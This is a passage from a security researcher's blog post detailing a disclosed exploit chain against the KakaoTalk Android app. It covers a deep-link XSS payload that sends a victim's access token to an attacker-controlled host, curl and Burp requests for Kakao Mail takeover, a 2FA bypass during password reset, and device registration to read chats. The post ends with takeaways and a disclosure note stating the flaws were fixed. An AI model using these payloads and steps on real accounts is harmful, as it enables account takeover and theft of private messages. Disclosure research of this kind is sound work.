512H48.054c-36.937.0-59.999-40.055-41.577-71.987L246.423 23.985c18.467-32.009 64.72-31.951 83.154.0l239.94 416.028zM288 354c-25.405.0-46 20.595-46 46s20.595 46 46 46 46-20.595 46-46-20.595-46-46-46zm-43.673-165.346 7.418 136c.347 6.364 5.609 11.346 11.982 11.346h48.546c6.373.0 11.635-4.982 11.982-11.346l7.418-136c.375-6.874-5.098-12.654-11.982-12.654h-63.383c-6.884.0-12.356 5.78-11.981 12.654z"/></symbol><symbol id="info-box" viewBox="0 0 512 512" preserveAspectRatio="xMidYMid meet"><path d="M256 8C119.043 8 8 119.083 8 256c0 136.997 111.043 248 248 248s248-111.003 248-248C504 119.083 392.957 8 256 8zm0 110c23.196.0 42 18.804 42 42s-18.804 42-42 42-42-18.804-42-42 18.804-42 42-42zm56 254c0 6.627-5.373 12-12 12h-88c-6.627.0-12-5.373-12-12v-24c0-6.627 5.373-12 12-12h12v-64h-12c-6.627.0-12-5.373-12-12v-24c0-6.627 5.373-12 12-12h64c6.627.0 12 5.373 12 12v1e2h12c6.627.0 12 5.373 12 12v24z"/></symbol></svg><div class="box box-shortcode info"><span class="icon-box baseline"><svg><use href="#info-box"/></svg></span><p>Btw, we could also start arbitrary non-exported app components since <code>CommerceBuyActivity</code> supports the <code>intent://</code> scheme.</p></div><h2 id=deep-link-to-kakao-mail-account-takeover>Deep Link to Kakao Mail Account Takeover<a hidden class=anchor aria-hidden=true href=#deep-link-to-kakao-mail-account-takeover>#</a></h2><p>As explained in the previous section, we can steal the user&rsquo;s access token by running arbitrary JS in the <code>CommerceBuyActivity</code> WebView. By crafting a malicious deep link, we could send the token to an attacker-controlled server:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>kakaotalk://buy/auth/0/cleanFrontRedirect?returnUrl=https://m.shoppinghow.kakao.com/m/product/Q24620753380/q:&#34;&gt;&lt;img src=x onerror=&#34;document.location=atob(&#39;aHR0cDovLzE5Mi4xNjguMTc4LjIwOjU1NTUv&#39;);&#34;&gt;
</span></span></code></pre></td></tr></table></div></div><p>Let&rsquo;s break it down:</p><ul><li><code>kakaotalk://buy</code> fires up <code>CommerceBuyActivity</code></li><li><code>/auth/0/cleanFrontRedirect?returnUrl=</code> &ldquo;compiles&rdquo; to <code>https://buy.kakao.com/auth/0/cleanFrontRedirect?returnUrl=</code> and redirects to any <code>kakao.com</code> domain</li><li><code>https://m.shoppinghow.kakao.com/m/product/Q24620753380/q:</code> had the XSS issue</li><li><code>">&lt;img src=x onerror="document.location=atob('aHR0cDovLzE5Mi4xNjguMTc4LjIwOjU1NTUv');"></code> is the XSS payload. We had to Base64 encode <code>http://192.168.178.20:5555/</code> to bypass some sanitization checks.</li></ul><p>Now, in possession of the access token what could we do with it? Well, how about we use it to take over the victim&rsquo;s Kakao Mail account that was used for KakaoTalk registration!</p><div class="box box-shortcode info"><span class="icon-box baseline"><svg><use href="#info-box"/></svg></span><p>If the victim doesn&rsquo;t have a Kakao Mail account it&rsquo;s possible to create a new Kakao Mail account on her/his behalf. This is interesting because creating a new Kakao Mail account overwrites the user&rsquo;s previous registered email-address with no additional checks. Scroll to the end of this section to check out how to do that.</p></div><p>First, we needed to check if the victim actually uses Kakao Mail:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>curl -i -s -k -X <span class=s1>$&#39;GET&#39;</span> <span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>    -H <span class=s1>$&#39;Host: katalk.kakao.com&#39;</span> -H <span class=s1>$&#39;Accept-Language: en&#39;</span> -H <span class=s1>$&#39;User-Agent: KT/10.4.3 An/11 en&#39;</span> -H <span class=s1>$&#39;Authorization: 64f03846070b4a9ea8d8798ce14220ce00000017017793161400011gzCIqV_7kN-deea3b5dc9cddb9d8345d95438207fc0981c2de80188082d9f6a8849db8ea92e&#39;</span> -H <span class=s1>$&#39;A: android/9.5.0/en&#39;</span> -H <span class=s1>$&#39;C: a327a1ad-b417-499a-abf7-48da89076e7c&#39;</span> -H <span class=s1>$&#39;Accept-Encoding: json, deflate, br&#39;</span> -H <span class=s1>$&#39;Connection: close&#39;</span> <span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>    <span class=s1>$&#39;https://katalk.kakao.com/android/account/more_settings.json?os_version=30&amp;model=SDK_GPHONE_ARM64&amp;since=1693786891&amp;lang=en&amp;vc=2610380&amp;email=2&amp;adid=&amp;adid_status=-1&#39;</span>
</span></span></code></pre></td></tr></table></div></div><p>Next, we had to grab another access token to access Kakao Mail:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>curl -i -s -k -X <span class=s1>$&#39;POST&#39;</span> <span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>    -H <span class=s1>$&#39;Host: api-account.kakao.com&#39;</span> -H <span class=s1>$&#39;Accept-Language: en&#39;</span> -H <span class=s1>$&#39;User-Agent: KT/10.4.3 An/11 en&#39;</span> -H <span class=s1>$&#39;Authorization: 64f03846070b4a9ea8d8798ce14220ce00000017017793161400011gzCIqV_7kN-deea3b5dc9cddb9d8345d95438207fc0981c2de80188082d9f6a8849db8ea92e&#39;</span> -H <span class=s1>$&#39;A: android/10.4.3/en&#39;</span> -H <span class=s1>$&#39;C: 2cc348d0-b7f7-464c-b72b-1e3f66a04362&#39;</span> -H <span class=s1>$&#39;Content-Type: application/x-www-form-urlencoded&#39;</span> -H <span class=s1>$&#39;Content-Length: 174&#39;</span> -H <span class=s1>$&#39;Accept-Encoding: json, deflate, br&#39;</span> -H <span class=s1>$&#39;Connection: close&#39;</span> <span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>    --data-binary <span class=s1>$&#39;key_type=talk_session_info&amp;key=64f03846070b4a9ea8d8798ce14220ce00000017017793161400011gzCIqV_7kN-deea3b5dc9cddb9d8345d95438207fc0981c2de80188082d9f6a8849db8ea92e&amp;referer=talk&#39;</span> <span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>    <span class=s1>$&#39;https://api-account.kakao.com/v1/auth/tgt&#39;</span>
</span></span></code></pre></td></tr></table></div></div><p>This was an example response:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-json data-lang=json><span class=line><span class=cl><span class=p>{</span><span class=nt>&#34;code&#34;</span><span class=p>:</span><span class=mi>0</span><span class=p>,</span><span class=nt>&#34;token&#34;</span><span class=p>:</span><span class=s2>&#34;5e09081b0cce35288422a0b6589ef860&#34;</span><span class=p>,</span><span class=nt>&#34;expires&#34;</span><span class=p>:</span><span class=mi>1700735745</span><span class=p>,</span><span class=nt>&#34;verifyToken&#34;</span><span class=p>:</span><span class=kc>null</span><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>With the newly gathered token we could access a victim&rsquo;s Kakao Mail account with Burp. Here&rsquo;s a way for you to reproduce it:</p><ol><li>Launch Burp&rsquo;s browser: go to the <code>Proxy > Intercept</code> tab, click <code>Open browser</code> and clear the browser&rsquo;s cache.</li><li>Go to the <code>Repeater</code> tab and create a new <code>HTTP</code> request (click on the <code>+</code> button).</li><li>Paste in the following (adapt the <code>Ka-Tgt</code> header accordingly):</li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>GET / HTTP/2
</span></span><span class=line><span class=cl>Host: talk.mail.kakao.com
</span></span><span class=line><span class=cl>Pragma: no-cache
</span></span><span class=line><span class=cl>Cache-Control: no-cache
</span></span><span class=line><span class=cl>Upgrade-Insecure-Requests: 1
</span></span><span class=line><span class=cl>User-Agent: Mozilla/5.0 (Linux; Android 11; sdk_gphone_arm64 Build/RSR1.210722.013.A6; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.114 Mobile Safari/537.36;KAKAOTALK 2610380
</span></span><span class=line><span class=cl>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
</span></span><span class=line><span class=cl>Km-Viewer-Ver: 1
</span></span><span class=line><span class=cl>Kakaotalk-Agent: os=android;osver=30;appver=10.4.3;lang=en;dtype=1;idiom=phone;device=SDK_GPHONE_ARM64
</span></span><span class=line><span class=cl>Ka-Tgt: 5e09081b0cce35288422a0b6589ef860
</span></span><span class=line><span class=cl>X-Requested-With: com.kakao.talk
</span></span><span class=line><span class=cl>Sec-Fetch-Site: none
</span></span><span class=line><span class=cl>Sec-Fetch-Mode: navigate
</span></span><span class=line><span class=cl>Sec-Fetch-User: ?1
</span></span><span class=line><span class=cl>Sec-Fetch-Dest: document
</span></span><span class=line><span class=cl>Accept-Encoding: gzip, deflate, br
</span></span><span class=line><span class=cl>Accept-Language: en-US,en;q=0.9
</span></span></code></pre></td></tr></table></div></div><ol start=4><li>Click on <code>Send</code> and confirm the target&rsquo;s details</li><li>Right-click in the request window, select <code>Request in browser > In original session</code> and copy the URL into Burp&rsquo;s browser.</li></ol><p>If necessary, we could also create a new Kakao Mail account on the user&rsquo;s behalf. Just repeat the same steps with Burp using the following HTTP request (adapt the <code>Authorization</code> header):</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>GET /kakao_mail/main?continue=https://talk.mail.kakao.com HTTP/1.1
</span></span><span class=line><span class=cl>Host: auth.kakao.com
</span></span><span class=line><span class=cl>Pragma: no-cache
</span></span><span class=line><span class=cl>Cache-Control: no-cache
</span></span><span class=line><span class=cl>Upgrade-Insecure-Requests: 1
</span></span><span class=line><span class=cl>User-Agent: Mozilla/5.0 (Linux; Android 11; sdk_gphone_arm64 Build/RSR1.210722.013.A6; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.114 Mobile Safari/537.36;KAKAOTALK 2610430
</span></span><span class=line><span class=cl>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
</span></span><span class=line><span class=cl>Authorization: 64f03846070b4a9ea8d8798ce14220ce00000017017793161400011gzCIqV_7kN-deea3b5dc9cddb9d8345d95438207fc0981c2de80188082d9f6a8849db8ea92e
</span></span><span class=line><span class=cl>Http_a: android/10.4.3/en
</span></span><span class=line><span class=cl>X-Requested-With: com.kakao.talk
</span></span><span class=line><span class=cl>Sec-Fetch-Site: none
</span></span><span class=line><span class=cl>Sec-Fetch-Mode: navigate
</span></span><span class=line><span class=cl>Sec-Fetch-User: ?1
</span></span><span class=line><span class=cl>Sec-Fetch-Dest: document
</span></span><span class=line><span class=cl>Accept-Encoding: gzip, deflate, br
</span></span><span class=line><span class=cl>Accept-Language: en-US,en;q=0.9
</span></span><span class=line><span class=cl>Connection: close
</span></span></code></pre></td></tr></table></div></div><p>When creating a new email address tick the box <code>Set As Primary Email</code>.</p><h2 id=kakaotalk-password-reset-with-burp>KakaoTalk Password Reset with Burp<a hidden class=anchor aria-hidden=true href=#kakaotalk-password-reset-with-burp>#</a></h2><p>With access to the victim&rsquo;s Kakao Mail account, a password reset was the next logical step. The only additional information required were the victim&rsquo;s email address, nickname and phone number which we got with the same curl query that we used above:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>curl -i -s -k -X <span class=s1>$&#39;GET&#39;</span> <span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>    -H <span class=s1>$&#39;Host: katalk.kakao.com&#39;</span> -H <span class=s1>$&#39;Accept-Language: en&#39;</span> -H <span class=s1>$&#39;User-Agent: KT/10.4.3 An/11 en&#39;</span> -H <span class=s1>$&#39;Authorization: 64f03846070b4a9ea8d8798ce14220ce00000017017793161400011gzCIqV_7kN-deea3b5dc9cddb9d8345d95438207fc0981c2de80188082d9f6a8849db8ea92e&#39;</span> -H <span class=s1>$&#39;A: android/9.5.0/en&#39;</span> -H <span class=s1>$&#39;C: a327a1ad-b417-499a-abf7-48da89076e7c&#39;</span> -H <span class=s1>$&#39;Accept-Encoding: json, deflate, br&#39;</span> -H <span class=s1>$&#39;Connection: close&#39;</span> <span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>    <span class=s1>$&#39;https://katalk.kakao.com/android/account/more_settings.json?os_version=30&amp;model=SDK_GPHONE_ARM64&amp;since=1693786891&amp;lang=en&amp;vc=2610380&amp;email=2&amp;adid=&amp;adid_status=-1&#39;</span>
</span></span></code></pre></td></tr></table></div></div><p>Changing the password via <code>https://accounts.kakao.com</code> turned out to be a bit complicated as we had to bypass 2FA via SMS. However, it was as simple as intercepting and modifying a couple of requests with Burp. This is how you can do it:</p><ol><li>Using the Burp browser visit the <a href="https://accounts.kakao.com/weblogin/find_password?lang=en&amp;continue=%2Flogin%3Fcontinue%3Dhttps%253A%252F%252Faccounts.kakao.com%252Fweblogin%252Faccount%252Finfo">Reset Password</a> link.</li><li>Add the victim&rsquo;s email address on the next page (<code>Reset password for your Kakao Account</code>). Before clicking on <code>Next</code>, enable the <code>Intercept</code> feature in Burp.</li><li>In Burp, forward all requests until you see a POST request to <code>/kakao_accounts/check_verify_type_for_find_password.json</code>. Right-click and select <code>Do intercept > Response to this request</code>.</li><li>In the response change <code>verify_types</code> to <code>0</code> (this sends the verification code to the victim&rsquo;s email address and not to her/his phone):</li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-json data-lang=json><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=nt>&#34;status&#34;</span><span class=p>:</span> <span class=mi>0</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=nt>&#34;verify_types&#34;</span><span class=p>:</span> <span class=p>[</span>
</span></span><span class=line><span class=cl>    <span class=mi>0</span>
</span></span><span class=line><span class=cl>  <span class=p>],</span>
</span></span><span class=line><span class=cl>  <span class=nt>&#34;suspended&#34;</span><span class=p>:</span> <span class=kc>false</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=nt>&#34;dormant&#34;</span><span class=p>:</span> <span class=kc>false</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=nt>&#34;kakaotalk&#34;</span><span class=p>:</span> <span class=kc>false</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=nt>&#34;expired&#34;</span><span class=p>:</span> <span class=kc>false</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=nt>&#34;created_at&#34;</span><span class=p>:</span> <span class=mi>1700754321</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=nt>&#34;two_step_verification&#34;</span><span class=p>:</span> <span class=kc>false</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=nt>&#34;is_fill_in_email&#34;</span><span class=p>:</span> <span class=kc>false</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=nt>&#34;account_type&#34;</span><span class=p>:</span> <span class=mi>0</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=nt>&#34;display_id&#34;</span><span class=p>:</span> <span class=kc>null</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><ol start=5><li>Disable <code>Intercept</code> in Burp and go back to Burp&rsquo;s browser. Click on <code>Using email address</code>.</li><li>Enter the victim&rsquo;s nickname and email address on the next page and click the <code>Verify</code> button.</li><li>Open a new browser tab and paste the Burp Repeater URL to access the user&rsquo;s Kakao Mail account (as described in the <a href=#deep-link-to-kakao-mail-account-takeover>previous</a> section). If the message <code>session expired</code> shows up, clear the browser&rsquo;s cache.</li><li>Grab the verification code from the email and enter it to proceed to the next page.</li><li>On the page <code>Additional user verification will proceed to protect your Kakao Account.</code>, enable <code>Intercept</code> in Burp again. Enter some values and click <code>Confirm</code>. Back in Burp when you see a POST request to <code>/kakao_accounts/check_phone_number.json</code>, adjust the <code>iso_code</code> and <code>phone_number</code> (without country code) parameters in the request body. Forward the request and disable the <code>Intercept</code> option again.</li><li>Finally, you can enter the new password.</li></ol><h2 id=poc>PoC<a hidden class=anchor aria-hidden=true href=#poc>#</a></h2><p>The goal of the PoC is to register <a href="https://www.kakaocorp.com/page/service/service/KakaoTalk?lang=en">KakaoTalk for Windows/MacOS</a> or the open-source client <a href=https://github.com/KiwiTalk/KiwiTalk>KiwiTalk</a> to a victim&rsquo;s account to read her/his <strong>non-end-to-end</strong> encrypted chat messages.</p><p>The steps for an attacker are as follows:</p><h3 id=attacker-prepares-the-malicious-deep-link>Attacker prepares the malicious deep link<a hidden class=anchor aria-hidden=true href=#attacker-prepares-the-malicious-deep-link>#</a></h3><p>First, she/he stores the payload to a file, &mldr;</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl><span class=o>&lt;</span><span class=nx>script</span><span class=o>&gt;</span>
</span></span><span class=line><span class=cl><span class=nx>location</span><span class=p>.</span><span class=nx>href</span> <span class=o>=</span> <span class=nb>decodeURIComponent</span><span class=p>(</span><span class=s2>&#34;kakaotalk%3A%2F%2Fbuy%2Fauth%2F0%2FcleanFrontRedirect%3FreturnUrl%3Dhttps%3A%2F%2Fm.shoppinghow.kakao.com%2Fm%2Fproduct%2FQ24620753380%2Fq%3A%22%3E%3Cimg%20src%3Dx%20onerror%3D%22document.location%3Datob%28%27aHR0cDovLzE5Mi4xNjguMTc4LjIwOjU1NTUv%27%29%3B%22%3E&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=o>&lt;</span><span class=err>/script&gt;</span>
</span></span></code></pre></td></tr></table></div></div><p>&mldr; starts the HTTP server and &mldr;</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ python3 -m http.server <span class=m>8888</span>
</span></span></code></pre></td></tr></table></div></div><p>&mldr; opens a Netcat listener in another terminal window: <code>$ nc -l 5555</code>. Easy ;-)</p><h3 id=victim-clicks-the-link-and-leaks-an-access-token-to-the-attacker>Victim clicks the link and leaks an access token to the attacker<a hidden class=anchor aria-hidden=true href=#victim-clicks-the-link-and-leaks-an-access-token-to-the-attacker>#</a></h3><p>Next, the attacker sends a URL (e.g., <code>http://192.168.178.20:8888/foo.html</code>) and waits until the victim clicks it. The access token should be then leaked in the Netcat listener:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>GET /foo.html HTTP/1.1
</span></span><span class=line><span class=cl>Host: 192.168.178.20:5555
</span></span><span class=line><span class=cl>Connection: keep-alive
</span></span><span class=line><span class=cl>Upgrade-Insecure-Requests: <span class=m>1</span>
</span></span><span class=line><span class=cl>User-Agent: Mozilla/5.0 <span class=o>(</span>Linux<span class=p>;</span> Android 10<span class=p>;</span> M2004J19C Build/QP1A.190711.020<span class=p>;</span> wv<span class=o>)</span> AppleWebKit/537.36 <span class=o>(</span>KHTML, like Gecko<span class=o>)</span> Version/4.0 Chrome/119.0.6045.66 Mobile Safari/537.36<span class=p>;</span>KAKAOTALK 2610420<span class=p>;</span>KAKAOTALK 10.4.2
</span></span><span class=line><span class=cl>Accept: text/html,application/xhtml+xml,application/xml<span class=p>;</span><span class=nv>q</span><span class=o>=</span>0.9,image/avif,image/webp,image/apng,*/*<span class=p>;</span><span class=nv>q</span><span class=o>=</span>0.8,application/signed-exchange<span class=p>;</span><span class=nv>v</span><span class=o>=</span>b3<span class=p>;</span><span class=nv>q</span><span class=o>=</span>0.7
</span></span><span class=line><span class=cl>authorization: 64f03846070b4a9ea8d8798ce14220ce00000017017793161400011gzCIqV_7kN-deea3b5dc9cddb9d8345d95438207fc0981c2de80188082d9f6a8849db8ea92e
</span></span><span class=line><span class=cl>os_name: Android
</span></span><span class=line><span class=cl>kakao-buy-version: 1.0
</span></span><span class=line><span class=cl>os_version: 10.4.2
</span></span><span class=line><span class=cl>X-Requested-With: com.kakao.talk
</span></span><span class=line><span class=cl>Accept-Encoding: gzip, deflate
</span></span><span class=line><span class=cl>Accept-Language: en-US,en<span class=p>;</span><span class=nv>q</span><span class=o>=</span>0.9
</span></span></code></pre></td></tr></table></div></div><h3 id=attacker-uses-the-access-token-to-reset-the-victims-password>Attacker uses the access token to reset the victim&rsquo;s password<a hidden class=anchor aria-hidden=true href=#attacker-uses-the-access-token-to-reset-the-victims-password>#</a></h3><p>Next, the attacker can now reset her/his KakaoTalk password (see instructions <a href=#kakaotalk-password-reset-with-burp>above</a>).</p><h3 id=attacker-registers-herhis-device-the-victims-kakaotalk-account>Attacker registers her/his device the victim&rsquo;s KakaoTalk account<a hidden class=anchor aria-hidden=true href=#attacker-registers-herhis-device-the-victims-kakaotalk-account>#</a></h3><p>When logging into KakaoTalk for Windows/MacOS or KiwiTalk with the victim&rsquo;s credentials a second authentication factor is required. It&rsquo;s a simple 4-digit pin which is either displayed in the PC version and needs to be entered in the KakaoTalk mobile app or the other way around (i.e., pin is sent to mobile app and needs to be entered in PC app).</p><p>Unfortunately, the pin can&rsquo;t be brute-forced as there&rsquo;s some rate limiting going on at the endpoints <code>https://talk-pilsner.kakao.com/talk-public/account/passcodeLogin/authorize</code> and <code>https://katalk.kakao.com/win32/account/register_device.json</code> (blocked after 5 attempts).</p><p>Luckily, we can still use the gathered access token to post/get the pin number to/from the KakaoTalk backend:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>curl -i -s -k -X <span class=s1>$&#39;POST&#39;</span> <span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>    -H <span class=s1>$&#39;Host: talk-pilsner.kakao.com&#39;</span> -H <span class=s1>$&#39;Authorization: 64f03846070b4a9ea8d8798ce14220ce00000017017793161400011gzCIqV_7kN-deea3b5dc9cddb9d8345d95438207fc0981c2de80188082d9f6a8849db8ea92e&#39;</span> -H <span class=s1>$&#39;Talk-Agent: android/10.4.3&#39;</span> -H <span class=s1>$&#39;Talk-Language: en&#39;</span> -H <span class=s1>$&#39;Content-Type: application/json; charset=UTF-8&#39;</span> -H <span class=s1>$&#39;Content-Length: 19&#39;</span> -H <span class=s1>$&#39;Accept-Encoding: gzip, deflate, br&#39;</span> -H <span class=s1>$&#39;User-Agent: okhttp/4.10.0&#39;</span> <span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>    --data-binary <span class=s1>$&#39;{\&#34;passcode\&#34;:\&#34;8825\&#34;}&#39;</span> <span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>    <span class=s1>$&#39;https://talk-pilsner.kakao.com/talk-public/account/passcodeLogin/authorize&#39;</span>
</span></span></code></pre></td></tr></table></div></div><p>Example response:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-json data-lang=json><span class=line><span class=cl><span class=p>{</span><span class=nt>&#34;device&#34;</span><span class=p>:{</span><span class=nt>&#34;name&#34;</span><span class=p>:</span><span class=s2>&#34;foo&#34;</span><span class=p>},</span><span class=nt>&#34;status&#34;</span><span class=p>:</span><span class=mi>0</span><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>In case the pin is sent to the KakaoTalk mobile app use this curl query:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>curl -i -s -k -X <span class=s1>$&#39;GET&#39;</span> <span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>    -H <span class=s1>$&#39;Host: katalk.kakao.com&#39;</span> -H <span class=s1>$&#39;Accept-Language: en&#39;</span> -H <span class=s1>$&#39;User-Agent: KT/10.4.3 An/11 en&#39;</span> -H <span class=s1>$&#39;Authorization: 64f03846070b4a9ea8d8798ce14220ce00000017017793161400011gzCIqV_7kN-deea3b5dc9cddb9d8345d95438207fc0981c2de80188082d9f6a8849db8ea92e&#39;</span> -H <span class=s1>$&#39;A: android/10.4.3/en&#39;</span> -H <span class=s1>$&#39;Accept-Encoding: json, deflate, br&#39;</span> -H <span class=s1>$&#39;Connection: close&#39;</span> <span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>    <span class=s1>$&#39;https://katalk.kakao.com/android/sub_device/settings/info.json&#39;</span>
</span></span></code></pre></td></tr></table></div></div><p>Example response:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-json data-lang=json><span class=line><span class=cl><span class=p>{</span><span class=nt>&#34;status&#34;</span><span class=p>:</span><span class=mi>0</span><span class=p>,</span><span class=nt>&#34;isVerified&#34;</span><span class=p>:</span><span class=kc>true</span><span class=p>,</span><span class=nt>&#34;passcode&#34;</span><span class=p>:</span><span class=s2>&#34;8825&#34;</span><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>And we&rsquo;re in! Profit &#x1f973; &#x1f973; &#x1f973;</p><video width=100% controls>
<source src=https://github.com/stulle123/kakaotalk_analysis/assets/14765446/7fd439c5-b96b-49d9-b8b5-cd9be2a51fe9 type=video/mp4></video><h2 id=takeaways>Takeaways<a hidden class=anchor aria-hidden=true href=#takeaways>#</a></h2><ol><li>There are still popular chat apps that don&rsquo;t require a very complex exploit chain to steal users&rsquo; messages.</li><li>If app developers make a couple of simple mistakes, Android&rsquo;s strong security model and message encryption won&rsquo;t help.</li><li>Asian chat apps are still underrepresented in the security research community. I hope this blog post will encourage fellow researchers to dig into those apps.</li></ol><h2 id=responsible-disclosure>Responsible Disclosure<a hidden class=anchor aria-hidden=true href=#responsible-disclosure>#</a></h2><p>We reported this vulnerability in December 2023 via <a href=https://bugbounty.kakao.com/>Kakao&rsquo;s Bug Bounty Program</a>. However, we didn&rsquo;t receive any reward as only Koreans are eligible to receive a bounty &#x1f92f;</p><p>As an immediate fix, Kakao Corp. took down <code>https://buy.kakao.com</code> and removed the <code>/auth/0/cleanFrontRedirect?returnUrl=</code> redirect. The vulnerable <code>CommerceBuyActivity</code> was removed in later versions (see <a href=https://github.com/stulle123/kakaotalk_analysis/tree/main/report>correspondence</a>).</p></div><footer class=post-footer><ul class=post-tags><li><a href=https://stulle123.github.io/tags/android/>Android</a></li><li><a 